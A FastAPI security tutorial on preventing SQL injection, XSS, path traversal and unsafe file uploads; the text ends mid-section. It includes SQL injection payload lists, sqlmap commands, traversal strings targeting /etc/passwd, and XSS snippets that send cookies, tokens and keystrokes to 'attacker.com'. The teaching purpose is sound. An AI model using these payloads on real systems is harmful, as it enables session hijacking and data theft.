# Day 3: Input Sanitization & Attack Prevention

**Date**: Week 4, Day 3  
**Phase**: 2 - FastAPI Mastery  
**Topic**: Protecting Against SQL Injection, XSS, Path Traversal, and File Upload Attacks

---

## Table of Contents

1. [Input Sanitization Overview](#input-sanitization-overview)
2. [SQL Injection Prevention](#sql-injection-prevention)
3. [XSS (Cross-Site Scripting) Prevention](#xss-cross-site-scripting-prevention)
4. [Path Traversal Prevention](#path-traversal-prevention)
5. [File Upload Validation](#file-upload-validation)
6. [Complete Practical Examples](#complete-practical-examples)
7. [Common Pitfalls](#common-pitfalls)
8. [Key Takeaways](#key-takeaways)
9. [Practice Exercises](#practice-exercises)

---

## 1. Input Sanitization Overview

### 1.1 Why Input Sanitization Matters

Input sanitization is a critical security practice that protects applications from malicious data injection. User-supplied input is the primary attack vector for web applications, accounting for the majority of OWASP Top 10 vulnerabilities.

**Core Principle**: Never trust user input. Every piece of data from external sources (form submissions, API requests, file uploads, query parameters) must be validated, sanitized, and handled securely before processing or storage.

**Attack Surface**: Input can come from:

- HTTP request bodies (JSON, form data)
- Query parameters and path parameters
- Headers (including cookies, custom headers)
- File uploads (filename, content, metadata)
- WebSocket messages
- Third-party API responses

### 1.2 Never Trust User Input

The "never trust user input" principle extends beyond obvious malicious intent. Even legitimate users may accidentally submit malformed data, and automated tools or compromised clients can inject dangerous payloads.

**Why this principle is absolute**:

- Client-side validation can be bypassed completely
- Data can be modified in transit (without HTTPS)
- Attackers use automated tools to probe for vulnerabilities
- A single unsanitized input point can compromise the entire system

**Trust Boundaries**:

```
External Input → Validation → Sanitization → Application Logic → Data Storage
     ↓              ↓             ↓                ↓                  ↓
  UNTRUSTED     VALIDATE      CLEAN/ESCAPE      SAFE USE        CLEAN STORAGE
```

### 1.3 Defense in Depth Strategy

Input sanitization is one layer in a comprehensive security strategy:

**Layer 1: Network Perimeter** (firewall, DDoS protection)
**Layer 2: Application Perimeter** (authentication, rate limiting)
**Layer 3: Input Validation** (reject malformed data)
**Layer 4: Input Sanitization** (clean potentially dangerous data)
**Layer 5: Output Encoding** (escape data before rendering)
**Layer 6: Query Parameterization** (prevent injection attacks)
**Layer 7: Least Privilege** (limit database/system access)

Each layer provides independent protection. If one fails, others still defend the system.

### 1.4 Validation vs Sanitization

**Validation**: Checking if input meets expected format/constraints, then rejecting invalid input.
**Sanitization**: Cleaning input by removing or escaping dangerous characters.

**When to use each**:

- **Validation first**: Reject clearly invalid data immediately (wrong type, out of range, malformed)
- **Sanitization second**: Clean acceptable data that may contain edge cases (HTML in user bio, filenames)

**Example**:

```python
# Validation: Reject completely
if not email_regex.match(user_email):
    raise ValueError("Invalid email format")

# Sanitization: Clean while accepting
safe_filename = filename.replace("..", "").replace("/", "")
```

### 1.5 OWASP Top 10 Injection Attacks

The OWASP Top 10 (2021) lists injection as A03:2021 – Injection. Key injection attack types:

1. **SQL Injection** - Manipulating database queries
2. **Cross-Site Scripting (XSS)** - Injecting malicious scripts into web pages
3. **Command Injection** - Executing system commands
4. **Path Traversal** - Accessing unauthorized files
5. **LDAP Injection** - Manipulating directory service queries
6. **XML Injection** - Exploiting XML parsers
7. **NoSQL Injection** - Manipulating NoSQL database queries

All share a common pattern: untrusted data interpreted as code or commands.

---

## 2. SQL Injection Prevention

### 2.1 What is SQL Injection?

SQL injection occurs when an attacker manipulates SQL queries by injecting malicious SQL code through user input. This happens when user input is concatenated directly into SQL statements without proper parameterization or escaping.

**Vulnerable Pattern**:

```python
# DANGEROUS - Never do this
user_id = request.query_params.get("user_id")
query = f"SELECT * FROM users WHERE id = {user_id}"
# Attacker sends: user_id=1 OR 1=1
# Result: SELECT * FROM users WHERE id = 1 OR 1=1
# This returns ALL users
```

### 2.2 SQL Injection Attack Examples

#### Basic Injection (Authentication Bypass)

**Vulnerable Code**:

```python
username = request.form.get("username")
password = request.form.get("password")
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
```

**Attack Input**:

```
username: admin' --
password: anything
```

**Resulting Query**:

```sql
SELECT * FROM users WHERE username='admin' -- ' AND password='anything'
```

The `--` comments out the rest of the query, bypassing password check.

#### Union-Based Injection (Data Extraction)

**Vulnerable Code**:

```python
product_id = request.query_params.get("id")
query = f"SELECT name, price FROM products WHERE id = {product_id}"
```

**Attack Input**:

```
id: 1 UNION SELECT username, password FROM users
```

**Resulting Query**:

```sql
SELECT name, price FROM products WHERE id = 1
UNION SELECT username, password FROM users
```

This extracts sensitive user data through the products endpoint.

#### Blind Injection (Boolean-Based)

When error messages are suppressed, attackers use true/false conditions:

**Attack Input**:

```
id: 1 AND (SELECT COUNT(*) FROM users) > 10
```

If page loads normally, there are more than 10 users. Attackers iterate to extract data bit by bit.

### 2.3 SQL Injection Impact

**Data Breach**: Attackers can read entire databases, including passwords, credit cards, personal information.

**Data Manipulation**: INSERT, UPDATE, DELETE operations can modify or destroy data.

**Authentication Bypass**: Direct login as any user without credentials.

**Privilege Escalation**: Accessing admin functions or other users' data.

**Remote Code Execution**: Some databases allow system command execution (xp_cmdshell in SQL Server).

**Denial of Service**: DROP TABLE commands or resource-intensive queries.

### 2.4 Prevention Strategies

#### Parameterized Queries (Prepared Statements)

The gold standard for SQL injection prevention. Parameters are sent separately from the SQL command, preventing interpretation as SQL code.

**How it works**:

1. SQL statement structure is sent to database
2. Database compiles the statement
3. Parameters are sent separately and treated as data only
4. No possibility of SQL code injection

**Database-level separation ensures safety regardless of input content.**

#### ORM Protection (SQLAlchemy)

Modern ORMs like SQLAlchemy automatically use parameterized queries:

```python
# SQLAlchemy automatically parameterizes
user = db.query(User).filter(User.id == user_id).first()
# Generated SQL: SELECT * FROM users WHERE id = ?
# Parameter: user_id (sent separately)
```

**ORM benefits**:

- Automatic parameterization
- Type safety
- Query building without string concatenation
- Protection against most injection attacks

**ORM limitations**:

- Raw SQL still requires manual parameterization
- `text()` queries need explicit parameters
- Custom SQL expressions must be carefully constructed

#### Input Validation

Validate before it reaches the database:

```python
# Type validation
if not isinstance(user_id, int):
    raise ValueError("User ID must be integer")

# Range validation
if user_id < 1 or user_id > 1000000:
    raise ValueError("Invalid user ID range")

# Pattern validation
if not re.match(r'^[a-zA-Z0-9_]+$', username):
    raise ValueError("Username contains invalid characters")
```

**Validation is defense in depth, not a replacement for parameterization.**

#### Least Privilege Database Users

Application database users should have minimal necessary permissions:

```sql
-- Create limited user
CREATE USER app_user WITH PASSWORD 'secure_password';

-- Grant only necessary permissions
GRANT SELECT, INSERT, UPDATE ON users TO app_user;
GRANT SELECT, INSERT, UPDATE ON products TO app_user;

-- Explicitly deny dangerous operations
REVOKE DELETE ON users FROM app_user;
REVOKE DROP ON ALL TABLES FROM app_user;
```

**Why this helps**:

- Even if SQL injection occurs, damage is limited
- Cannot drop tables or databases
- Cannot access system tables
- Cannot execute administrative commands

### 2.5 Parameterized Query Examples

#### Raw SQL with Parameterization

```python
from sqlalchemy import text

# PostgreSQL parameterization
query = text("SELECT * FROM users WHERE username = :username AND age > :min_age")
result = db.execute(query, {"username": username, "min_age": 18})

# MySQL parameterization (uses %s placeholder)
query = text("SELECT * FROM users WHERE username = %s AND age > %s")
result = db.execute(query, (username, 18))

# SQLite parameterization (uses ? placeholder)
query = text("SELECT * FROM users WHERE username = ? AND age > ?")
result = db.execute(query, (username, 18))
```

**Key points**:

- Named parameters (`:name`) are clearest and prevent ordering errors
- Never use string formatting (%, format(), f-strings) with SQL
- Parameters are automatically escaped and type-checked

#### SQLAlchemy ORM Queries

```python
from sqlalchemy.orm import Session
from models import User

def get_user_by_credentials(db: Session, username: str, password: str):
    # Automatic parameterization
    return db.query(User).filter(
        User.username == username,
        User.password_hash == hash_password(password)
    ).first()

def search_products(db: Session, search_term: str, min_price: float):
    # Safe LIKE query
    return db.query(Product).filter(
        Product.name.like(f"%{search_term}%"),  # SQLAlchemy handles escaping
        Product.price >= min_price
    ).all()
```

### 2.6 Pydantic Validation for SQL Safety

```python
from pydantic import BaseModel, Field, validator
import re

class UserSearchQuery(BaseModel):
    username: str = Field(..., min_length=3, max_length=50)
    age_min: int = Field(0, ge=0, le=150)
    sort_by: str = Field("created_at")

    @validator('username')
    def username_alphanumeric(cls, v):
        if not re.match(r'^[a-zA-Z0-9_]+$', v):
            raise ValueError('Username must be alphanumeric with underscores only')
        return v

    @validator('sort_by')
    def sort_by_whitelist(cls, v):
        allowed_fields = ['created_at', 'username', 'email']
        if v not in allowed_fields:
            raise ValueError(f'Sort field must be one of {allowed_fields}')
        return v

@app.get("/users/search")
def search_users(query: UserSearchQuery, db: Session = Depends(get_db)):
    # Input is validated before reaching this point
    results = db.query(User).filter(
        User.username.like(f"%{query.username}%"),
        User.age >= query.age_min
    ).order_by(query.sort_by).all()

    return results
```

### 2.7 Testing for SQL Injection

**Manual Testing Payloads**:

```
# Authentication bypass
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' /*
admin' --
admin' #

# Union-based
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT username,password FROM users--

# Boolean-based blind
' AND '1'='1
' AND '1'='2
' AND 1=1--
' AND 1=2--

# Time-based blind
'; WAITFOR DELAY '00:00:05'--
'; SELECT SLEEP(5)--
```

**Automated Testing**:

```bash
# SQLMap - automated SQL injection testing
sqlmap -u "http://localhost:8000/api/users?id=1" --batch

# Test specific parameter
sqlmap -u "http://localhost:8000/api/search" --data="query=test" -p query
```

**Unit Testing for Protection**:

```python
import pytest
from fastapi.testclient import TestClient

def test_sql_injection_protection(client: TestClient):
    # Test single quote injection
    response = client.get("/users/search?username=' OR '1'='1")
    assert response.status_code == 422  # Validation error

    # Test union injection
    response = client.get("/products?id=1 UNION SELECT * FROM users")
    assert response.status_code == 422

    # Test comment injection
    response = client.get("/users?name=admin' --")
    assert response.status_code == 422
```

---

## 3. XSS (Cross-Site Scripting) Prevention

### 3.1 What is XSS?

Cross-Site Scripting (XSS) is an injection attack where malicious scripts are injected into trusted websites. These scripts execute in victims' browsers, allowing attackers to:

- Steal session cookies and authentication tokens
- Redirect users to malicious sites
- Modify page content
- Log keystrokes
- Perform actions as the authenticated user

**Core vulnerability**: Application includes untrusted data in web pages without proper validation or escaping.

### 3.2 XSS Attack Types

#### Stored XSS (Persistent)

Malicious script is permanently stored on the target server (database, message forum, comment field). Every user who views the infected page executes the script.

**Example Flow**:

1. Attacker submits malicious comment: `<script>steal_cookies()</script>`
2. Server stores comment in database without sanitization
3. Other users view comments page
4. Script executes in their browsers

**Impact**: Highest risk. Affects all users viewing the content.

#### Reflected XSS (Non-Persistent)

Malicious script is reflected off the web server (error messages, search results). Attacker must trick victim into clicking a malicious link.

**Example Flow**:

1. Attacker crafts URL: `https://site.com/search?q=<script>steal_cookies()</script>`
2. Attacker sends URL to victim via email/social media
3. Victim clicks link
4. Server reflects search query in response without escaping
5. Script executes in victim's browser

**Impact**: Requires social engineering but easier to execute at scale.

#### DOM-Based XSS

Vulnerability exists in client-side code. Malicious payload is processed by client-side JavaScript rather than server.

**Example**:

```javascript
// Vulnerable client-side code
var search = window.location.hash.substring(1);
document.getElementById("results").innerHTML = "Results for: " + search;

// Attacker URL: https://site.com/#<img src=x onerror=alert(document.cookie)>
```

**Impact**: Bypasses server-side protections. Requires careful client-side coding.

### 3.3 XSS Attack Examples

#### Cookie Theft

```html
<script>
  fetch("https://attacker.com/steal?cookie=" + document.cookie);
</script>
```

#### Session Hijacking

```html
<script>
  fetch("https://attacker.com/log?token=" + localStorage.getItem("auth_token"));
</script>
```

#### Keylogger Injection

```html
<script>
  document.addEventListener("keypress", function (e) {
    fetch("https://attacker.com/log?key=" + e.key);
  });
</script>
```

#### Page Defacement

```html
<script>
  document.body.innerHTML = "<h1>Hacked by Attacker</h1>";
</script>
```

#### Phishing

```html
<script>
  document.body.innerHTML =
    '<form action="https://attacker.com/phish"><input name="password" placeholder="Re-enter password"></form>';
</script>
```

### 3.4 XSS Impact

**Session Hijacking**: Steal authentication cookies to impersonate users.

**Data Theft**: Access sensitive data visible to the user (personal info, financial data).

**Malware Distribution**: Redirect to sites hosting malware.

**Credential Harvesting**: Display fake login forms to capture credentials.

**Website Defacement**: Modify page content to damage reputation.

**Propagation**: In social media or forums, XSS can spread automatically (worms).

### 3.5 Prevention Strategies

#### HTML Escaping/Encoding

Convert special HTML characters to their entity equivalents:

```
<  →  &lt;
>  →  &gt;
"  →  &quot;
'  →  &#x27;
&  →  &amp;
/  →  &#x2F;
```

**Why this works**: Browser renders these as text, not HTML tags.

**Example**:

```
Input:  <script>alert('XSS')</script>
Escaped: &lt;script&gt;alert(&#x27;XSS&#x27;)&lt;&#x2F;script&gt;
Rendered: <script>alert('XSS')</script> (as visible text, not executed)
```

#### Content Security Policy (CSP)

HTTP header that instructs browsers which sources of content are allowed to execute.

**CSP Header Example**:

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com; style-src 'self' 'unsafe-inline'; img-src *
```

**CSP Directives**:

- `default-src`: Fallback for all resource types
- `script-src`: Valid sources for JavaScript
- `style-src`: Valid sources for CSS
- `img-src`: Valid sources for images
- `connect-src`: Valid sources for fetch/XHR/WebSocket
- `font-src`: Valid sources for fonts
- `frame-src`: Valid sources for frames

**CSP Protection Levels**:

```http
# Level 1: Block inline scripts entirely
Content-Security-Policy: script-src 'self'

# Level 2: Allow specific inline scripts via nonce
Content-Security-Policy: script-src 'self' 'nonce-{random}'

# Level 3: Strict dynamic (modern approach)
Content-Security-Policy: script-src 'strict-dynamic' 'nonce-{random}'
```

#### Input Validation

Whitelist acceptable input patterns:

```python
import re
from pydantic import BaseModel, validator

class CommentCreate(BaseModel):
    text: str

    @validator('text')
    def no_scripts(cls, v):
        # Block obvious script tags
        if re.search(r'<script|javascript:', v, re.IGNORECASE):
            raise ValueError('Script tags not allowed')
        return v
```

**Note**: Validation alone is insufficient. Blacklists are easily bypassed.

#### Output Encoding

Encode data based on context where it's used:

**HTML Context**:

```python
import html
safe_html = html.escape(user_input)
```

**JavaScript Context**:

```python
import json
safe_js = json.dumps(user_input)
```

**URL Context**:

```python
from urllib.parse import quote
safe_url = quote(user_input)
```

**CSS Context**: Avoid user input in CSS. If necessary, strict validation required.

#### HTTPOnly Cookies

Prevent JavaScript access to sensitive cookies:

```python
from fastapi import Response

response = Response()
response.set_cookie(
    key="session_token",
    value=session_token,
    httponly=True,      # JavaScript cannot access
    secure=True,        # HTTPS only
    samesite="strict"   # CSRF protection
)
```

**Why this helps**: Even if XSS occurs, session cookies remain protected.

### 3.6 HTML Escaping in FastAPI

```python
from fastapi import FastAPI, Request, Form
from fastapi.responses import HTMLResponse
from fastapi.templating import Jinja2Templates
import html

app = FastAPI()
templates = Jinja2Templates(directory="templates")

@app.post("/comment")
async def create_comment(comment: str = Form(...)):
    # Manual escaping
    safe_comment = html.escape(comment)

    # Store safe_comment in database
    db.save(safe_comment)

    return {"comment": safe_comment}

@app.get("/comments", response_class=HTMLResponse)
async def show_comments(request: Request):
    comments = db.get_all_comments()

    # Jinja2 auto-escapes by default
    return templates.TemplateResponse("comments.html", {
        "request": request,
        "comments": comments
    })
```

**Jinja2 Template (auto-escaping enabled)**:

```html
<!-- Auto-escaped by default -->
<div class="comment">{{ comment.text }}</div>

<!-- Explicitly disable escaping (DANGEROUS - only for trusted content) -->
<div class="trusted-html">{{ comment.text | safe }}</div>

<!-- Explicit escaping (redundant but clear) -->
<div class="comment">{{ comment.text | e }}</div>
```

### 3.7 Content Sanitization Libraries

For rich text input (HTML allowed but sanitized):

```python
from bleach import clean

# Whitelist-based sanitization
ALLOWED_TAGS = ['p', 'br', 'strong', 'em', 'ul', 'ol', 'li', 'a']
ALLOWED_ATTRS = {'a': ['href', 'title']}

def sanitize_html(dirty_html: str) -> str:
    clean_html = clean(
        dirty_html,
        tags=ALLOWED_TAGS,
        attributes=ALLOWED_ATTRS,
        strip=True  # Remove disallowed tags entirely
    )
    return clean_html

@app.post("/article")
def create_article(content: str = Form(...)):
    # Allow safe HTML tags, strip dangerous ones
    safe_content = sanitize_html(content)

    # Input: <p>Hello</p><script>alert('XSS')</script>
    # Output: <p>Hello</p>

    db.save(safe_content)
    return {"content": safe_content}
```

**Bleach Configuration**:

```python
import bleach

# Strict configuration (plain text only)
def strip_all_html(text: str) -> str:
    return bleach.clean(text, tags=[], strip=True)

# Permissive configuration (common formatting)
def allow_formatting(text: str) -> str:
    return bleach.clean(
        text,
        tags=['p', 'br', 'strong', 'em', 'u', 'h1', 'h2', 'h3'],
        attributes={},
        strip=True
    )

# Link sanitization
def sanitize_links(text: str) -> str:
    return bleach.linkify(
        bleach.clean(text, tags=['a'], attributes={'a': ['href']}),
        parse_email=True
    )
```

### 3.8 Testing for XSS

**Manual Testing Payloads**:

```html
<!-- Basic script injection -->
<script>
  alert("XSS");
</script>

<!-- IMG tag with event handler -->
<img src=x onerror=alert('XSS')>

<!-- SVG with JavaScript -->
<svg onload=alert('XSS')>

<!-- Anchor with JavaScript protocol -->
<a href="javascript:alert('XSS')">Click</a>

<!-- Form with JavaScript action -->
<form action="javascript:alert('XSS')"><input type="submit" /></form>

<!-- Base64 encoded script -->
<script src="data:text/javascript;base64,YWxlcnQoJ1hTUycp"></script>

<!-- HTML entity encoding bypass -->
<img
  src="x"
  onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;"
/>

<!-- Case variation bypass -->
<script>
  alert("XSS");
</script>

<!-- Null byte injection -->
<scri\x00pt>alert('XSS')</scri\x00pt>
```

**Automated XSS Testing**:

```bash
# XSStrike
python xsstrike.py -u "http://localhost:8000/search?q=test"

# OWASP ZAP
zap-cli quick-scan http://localhost:8000
```

**Unit Tests**:

```python
def test_xss_prevention(client: TestClient):
    # Test script tag
    response = client.post(
        "/comment",
        data={"text": "<script>alert('XSS')</script>"}
    )
    assert "<script>" not in response.json()["text"]
    assert "&lt;script&gt;" in response.json()["text"]

    # Test event handler
    response = client.post(
        "/comment",
        data={"text": "<img src=x onerror=alert('XSS')>"}
    )
    assert "onerror=" not in response.json()["text"]
```

---

## 4. Path Traversal Prevention

### 4.1 What is Path Traversal?

Path traversal (directory traversal) allows attackers to access files and directories outside the intended directory. This occurs when user input is used to construct file paths without proper validation.

**Vulnerable Pattern**:

```python
# DANGEROUS
filename = request.query_params.get("file")
file_path = f"/app/uploads/{filename}"
with open(file_path, 'r') as f:
    return f.read()

# Attacker sends: file=../../etc/passwd
# Resulting path: /app/uploads/../../etc/passwd → /etc/passwd
```

### 4.2 Path Traversal Attack Examples

#### Basic Directory Traversal

```
file=../../etc/passwd
file=../../etc/shadow
file=../../app/config.py
file=../../../../var/log/auth.log
```

#### Absolute Path Bypass

```
file=/etc/passwd
file=C:\Windows\System32\config\SAM  (Windows)
```

#### URL Encoding

```
file=..%2F..%2Fetc%2Fpasswd
file=%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

#### Double Encoding

```
file=%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

#### Null Byte Injection (older systems)

```
file=../../etc/passwd%00.txt
# System reads up to null byte, ignoring .txt
```

#### Unicode/UTF-8 Bypass

```
file=..%c0%af..%c0%afetc%c0%afpasswd
```

### 4.3 Prevention Strategies

#### Path Validation

**Canonicalize paths** (resolve to absolute path) and verify they're within allowed directory:

```python
from pathlib import Path

UPLOAD_DIR = Path("/app/uploads").resolve()

def validate_path(filename: str) -> Path:
    # Construct full path
    requested_path = (UPLOAD_DIR / filename).resolve()

    # Verify path is within allowed directory
    if not requested_path.is_relative_to(UPLOAD_DIR):
        raise ValueError("Path traversal detected")

    return requested_path
```

**How `resolve()` works**:

- Converts relative paths to absolute
- Resolves symbolic links
- Removes `.` and `..` components
- Returns canonical (normalized) path

#### Whitelist Approach

Only allow predefined safe values:

```python
ALLOWED_FILES = {
    "avatar": "/app/uploads/avatars/default.png",
    "logo": "/app/static/logo.png",
    "terms": "/app/legal/terms.pdf"
}

def get_file(file_id: str) -> Path:
    if file_id not in ALLOWED_FILES:
        raise ValueError("Invalid file ID")

    return Path(ALLOWED_FILES[file_id])
```

#### Restrict Base Directory

Never allow user input to specify directory, only filename:

```python
from pathlib import Path
import re

UPLOAD_DIR = Path("/app/uploads").resolve()

def safe_filename(filename: str) -> str:
    # Remove directory components
    filename = Path(filename).name

    # Remove non-alphanumeric characters (except . - _)
    filename = re.sub(r'[^a-zA-Z0-9._-]', '', filename)

    # Limit length
    filename = filename[:255]

    return filename

def get_upload_path(filename: str) -> Path:
    safe_name = safe_filename(filename)
    return UPLOAD_DIR / safe_name
```

#### Secure File Operations

Use Python's `pathlib` for safe path manipulation:

```python
from pathlib import Path

UPLOAD_DIR = Path("/app/uploads").resolve()

def read_user_file(filename: str) -> bytes:
    # Safely construct path
    file_path = UPLOAD_DIR / filename

    # Resolve to canonical path
    file_path = file_path.resolve()

    # Verify still within upload directory
    if not file_path.is_relative_to(UPLOAD_DIR):
        raise ValueError("Invalid file path")

    # Verify file exists and is a file (not directory)
    if not file_path.is_file():
        raise FileNotFoundError("File not found")

    # Read file
    return file_path.read_bytes()
```

### 4.4 Secure Path Handling in Python

**Using `pathlib` (recommended)**:

```python
from pathlib import Path

def secure_file_access(filename: str) -> Path:
    base_dir = Path("/app/data").resolve()

    # Construct path
    file_path = base_dir / filename

    # Resolve to absolute path (removes .., ., symlinks)
    file_path = file_path.resolve()

    # Security check: ensure still within base directory
    if not file_path.is_relative_to(base_dir):
        raise ValueError(f"Path traversal attempt: {filename}")

    # Additional checks
    if not file_path.exists():
        raise FileNotFoundError(f"File not found: {filename}")

    if not file_path.is_file():
        raise ValueError(f"Not a file: {filename}")

    return file_path
```

**Old approach with `os.path` (not recommended)**:

```python
import os

def legacy_secure_path(filename: str) -> str:
    base_dir = os.path.abspath("/app/data")
    file_path = os.path.abspath(os.path.join(base_dir, filename))

    # Check if path starts with base directory
    if not file_path.startswith(base_dir + os.sep):
        raise ValueError("Path traversal attempt")

    return file_path
```

**Why `pathlib` is better**:

- More readable and maintainable
- Cross-platform path handling
- Built-in security-focused methods
- Less error-prone than string manipulation

### 4.5 Code Examples

```python
from fastapi import FastAPI, HTTPException, UploadFile
from pathlib import Path
import re

app = FastAPI()

UPLOAD_DIR = Path("/app/uploads").resolve()
UPLOAD_DIR.mkdir(parents=True, exist_ok=True)

def sanitize_filename(filename: str) -> str:
    """
    Remove dangerous characters from filename.
    Keeps only alphanumeric, dots, hyphens, underscores.
    """
    # Get basename (remove any directory components)
    filename = Path(filename).name

    # Remove potentially dangerous characters
    filename = re.sub(r'[^a-zA-Z0-9._-]', '', filename)

    # Remove leading dots (hidden files on Unix)
    filename = filename.lstrip('.')

    # Ensure not empty after sanitization
    if not filename:
        raise ValueError("Invalid filename")

    # Limit length
    if len(filename) > 255:
        name, ext = filename.rsplit('.', 1) if '.' in filename else (filename, '')
        filename = name[:250] + ('.' + ext if ext else '')

    return filename

def validate_file_path(filename: str) -> Path:
    """
    Validate file path is within allowed directory.
    Returns canonical path if valid, raises ValueError if invalid.
    """
    # Sanitize filename first
    safe_filename = sanitize_filename(filename)

    # Construct full path
    file_path = (UPLOAD_DIR / safe_filename).resolve()

    # Verify path is within upload directory
    if not file_path.is_relative_to(UPLOAD_DIR):
        raise ValueError("Path traversal detected")

    return file_path

@app.post("/upload")
async def upload_file(file: UploadFile):
    """
    Secure file upload endpoint.
    """
    try:
        # Validate and get safe path
        safe_path = validate_file_path(file.filename)

        # Write file
        content = await file.read()
        safe_path.write_bytes(content)

        return {
            "filename": safe_path.name,
            "size": len(content)
        }

    except ValueError as e:
        raise HTTPException(status_code=400, detail=str(e))

@app.get("/download/{filename}")
async def download_file(filename: str):
    """
    Secure file download endpoint.
    """
    try:
        # Validate path
        file_path = validate_file_path(filename)

        # Verify file exists
        if not file_path.is_file():
            raise HTTPException(status_code=404, detail="File not found")

        # Read and return file
        from fastapi.responses import FileResponse
        return FileResponse(
            path=file_path,
            filename=file_path.name,
            media_type='application/octet-stream'
        )

    except ValueError:
        raise HTTPException(status_code=400, detail="Invalid filename")

@app.get("/files")
async def list_files():
    """
    List files in upload directory (safe).
    """
    files = []
    for file_path in UPLOAD_DIR.iterdir():
        if file_path.is_file():
            files.append({
                "name": file_path.name,
                "size": file_path.stat().st_size
            })

    return {"files": files}
```

**Testing Path Traversal Protection**:

```python
import pytest
from fastapi.testclient import TestClient

def test_path_traversal_prevention(client: TestClient):
    # Test basic traversal
    response = client.get("/download/../../etc/passwd")
    assert response.status_code == 400

    # Test URL encoded traversal
    response = client.get("/download/..%2F..%2Fetc%2Fpasswd")
    assert response.status_code == 400

    # Test absolute path
    response = client.get("/download//etc/passwd")
    assert response.status_code == 400

    # Test legitimate file
    response = client.get("/download/legitimate.txt")
    assert response.status_code in [200, 404]  # 404 if file doesn't exist
```

---

## 5. File Upload Validation

### 5.1 File Upload Security Risks

File uploads are a major attack vector. Risks include:

**Malicious File Execution**: Uploading executable files (PHP, JSP, executable binaries) that run on server.

**Path Traversal via Filename**: Filenames like `../../evil.php` to write outside upload directory.

**Denial of Service**: Uploading extremely large files to exhaust disk space or bandwidth.

**Virus/Malware Distribution**: Using the server to host and distribute malware.

**Content Injection**: Uploading HTML/SVG files with embedded JavaScript (XSS).

**Resource Exhaustion**: Uploading files that consume excessive processing (ZIP bombs, XML bombs).

**Server-Side Request Forgery (SSRF)**: Uploading files that trigger server to make requests to internal resources.

### 5.2 File Type Validation

**Never trust file extensions alone.** Attackers easily rename files.

#### MIME Type Checking

Based on HTTP Content-Type header (easily spoofed):

```python
from fastapi import UploadFile, HTTPException

ALLOWED_MIME_TYPES = {
    "image/jpeg",
    "image/png",
    "image/gif",
    "image/webp",
    "application/pdf"
}

async def validate_mime_type(file: UploadFile):
    if file.content_type not in ALLOWED_MIME_TYPES:
        raise HTTPException(
            status_code=400,
            detail=f"File type {file.content_type} not allowed"
        )
```

**Weakness**: Content-Type header is client-supplied and can be forged.

#### Magic Number Validation

Verify file type by reading file header (magic bytes):

```python
import imghdr
from io import BytesIO

ALLOWED_IMAGE_TYPES = {'jpeg', 'png', 'gif', 'webp'}

async def validate_image(file: UploadFile):
    # Read file content
    content = await file.read()

    # Reset file pointer for later use
    await file.seek(0)

    # Detect actual file type from content
    file_type = imghdr.what(None, h=content)

    if file_type not in ALLOWED_IMAGE_TYPES:
        raise HTTPException(
            status_code=400,
            detail=f"Invalid image file. Detected type: {file_type}"
        )

    return content
```

**Common Magic Numbers**:

```python
MAGIC_NUMBERS = {
    'jpeg': [b'\xFF\xD8\xFF'],
    'png': [b'\x89\x50\x4E\x47'],
    'gif': [b'\x47\x49\x46\x38'],
    'pdf': [b'\x25\x50\x44\x46'],
    'zip': [b'\x50\x4B\x03\x04', b'\x50\x4B\x05\x06', b'\x50\x4B\x07\x08']
}

def check_magic_number(content: bytes) -> str:
    for file_type, signatures in MAGIC_NUMBERS.items():
        for signature in signatures:
            if content.startswith(signature):
                return file_type
    return None
```

#### File Extension Validation

Whitelist allowed extensions:

```python
from pathlib import Path

ALLOWED_EXTENSIONS = {'.jpg', '.jpeg', '.png', '.gif', '.pdf'}

def validate_extension(filename: str) -> bool:
    ext = Path(filename).suffix.lower()
    if ext not in ALLOWED_EXTENSIONS:
        raise ValueError(f"File extension {ext} not allowed")
    return True
```

**Best Practice**: Combine all three methods (MIME type, magic number, extension).

### 5.3 File Size Limits

Prevent DoS via large uploads:

```python
from fastapi import UploadFile, HTTPException, Request
from starlette.datastructures import UploadFile as StarletteUploadFile

MAX_FILE_SIZE = 5 * 1024 * 1024  # 5 MB

async def validate_file_size(file: UploadFile):
    content = await file.read()
    file_size = len(content)

    if file_size > MAX_FILE_SIZE:
        raise HTTPException(
            status_code=413,
            detail=f"File too large. Max size: {MAX_FILE_SIZE} bytes"
        )

    # Reset file pointer
    await file.seek(0)

    return content

@app.post("/upload")
async def upload_file(file: UploadFile):
    content = await validate_file_size(file)
    # Process file...
```

**Application-Level Size Limit** (FastAPI startup):

```python
from fastapi import FastAPI, Request
from starlette.middleware import Middleware
from starlette.middleware.base import BaseHTTPMiddleware

MAX_REQUEST_SIZE = 10 * 1024 * 1024  # 10 MB

class RequestSizeLimitMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next):
        if request.method in ['POST', 'PUT', 'PATCH']:
            content_length = request.headers.get('content-length')
            if content_length and int(content_length) > MAX_REQUEST_SIZE:
                return JSONResponse(
                    status_code=413,
                    content={"detail": "Request too large"}
                )
        return await call_next(request)

app = FastAPI(middleware=[Middleware(RequestSizeLimitMiddleware)])
```

### 5.4 Filename Sanitization

Remove dangerous characters and prevent path traversal:

```python
import re
import uuid
from pathlib import Path

def sanitize_filename(filename: str) -> str:
    """
    Sanitize uploaded filename.
    """
    # Get basename only (remove any path components)
    filename = Path(filename).name

    # Remove non-alphanumeric characters except . - _
    filename = re.sub(r'[^a-zA-Z0-9._-]', '', filename)

    # Remove leading/trailing dots and spaces
    filename = filename.strip('. ')

    # Remove multiple consecutive dots
    filename = re.sub(r'\.{2,}', '.', filename)

    # Limit length
    if len(filename) > 255:
        name, ext = filename.rsplit('.', 1) if '.' in filename else (filename, '')
        filename = name[:250] + ('.' + ext if ext else '')

    # Fallback if filename becomes empty
    if not filename:
        filename = "unnamed_file"

    return filename

def generate_unique_filename(original_filename: str) -> str:
    """
    Generate unique filename with UUID prefix.
    Prevents overwrites and obfuscates original names.
    """
    safe_filename = sanitize_filename(original_filename)
    extension = Path(safe_filename).suffix
    unique_name = f"{uuid.uuid4()}{extension}"
    return unique_name
```

**Length Limits**:

- Most filesystems: 255 characters max
- Database fields: Set reasonable limits (e.g., 100-200 chars)
- URLs: Shorter is better for web serving

### 5.5 File Content Scanning

#### Virus Scanning Integration

